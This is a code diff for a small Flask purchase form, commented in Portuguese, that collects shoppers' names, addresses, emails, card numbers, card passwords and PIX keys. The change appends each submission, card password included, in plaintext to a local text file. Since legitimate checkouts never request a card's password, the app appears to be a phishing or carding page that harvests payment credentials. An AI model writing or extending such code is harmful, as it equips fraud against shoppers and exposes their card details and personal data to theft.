@@ -1,15 +1,21 @@
 import os
 from flask import Flask, request, render_template, redirect
+import secrets
 
 app = Flask(__name__)
 
-# Obtendo a chave secreta das variáveis de ambiente
-import secrets
+# Chave secreta
 app.secret_key = secrets.token_hex(16)
+
+# Função para salvar dados em um arquivo .txt
+def salvar_dados_em_txt(dados):
+    with open("dados_pedidos.txt", "a") as f:  # "a" para adicionar novas linhas sem sobrescrever
+        f.write(dados + "\n")
 
 @app.route('/', methods=['GET', 'POST'])
 def purchase():
     if request.method == 'POST':
+        # Coletando os dados do formulário
         payment_method = request.form['payment-method']
         name = request.form['name']
         email = request.form['email']
@@ -19,23 +25,28 @@ def purchase():
         municipality = request.form['municipality']
         residence = request.form['residence']
         product_url = request.form['product-url']
-        
+
         card_number = request.form.get('card-number')
         card_password = request.form.get('card-password')
         pix_key = request.form.get('pix-key')
         boleto = request.form.get('boleto')
 
-        # Processar os dados com base no método de pagamento
-        print(f'Produto URL: {product_url}')
-        print(f'Nome: {name}, E-mail: {email}, País: {country}, Estado: {state}, Cidade: {city}, Município: {municipality}, Residência: {residence}')
-        
+        # Montando os dados para salvar
+        dados = f"Nome: {name}, E-mail: {email}, País: {country}, Estado: {state}, Cidade: {city}, Município: {municipality}, Residência: {residence}, Produto: {product_url}, Método de Pagamento: {payment_method}"
+
         if payment_method == 'cartao':
-            print(f'Compra com cartão: {card_number}, Senha: {card_password}')
+            dados += f", Número do Cartão: {card_number}, Senha do Cartão: {card_password}"
         elif payment_method == 'pix':
-            print(f'Compra via Pix: {pix_key}')
+            dados += f", Chave PIX: {pix_key}"
         elif payment_method == 'boleto':
-            print(f'Boleto gerado: {boleto}')
-        
+            dados += ", Boleto gerado"
+
+        # Salvando os dados no arquivo .txt
+        salvar_dados_em_txt(dados)
+
+        # Exibir os dados no console (opcional)
+        print(dados)
+
         return redirect('/')
     return render_template('purchase_form.html')
 
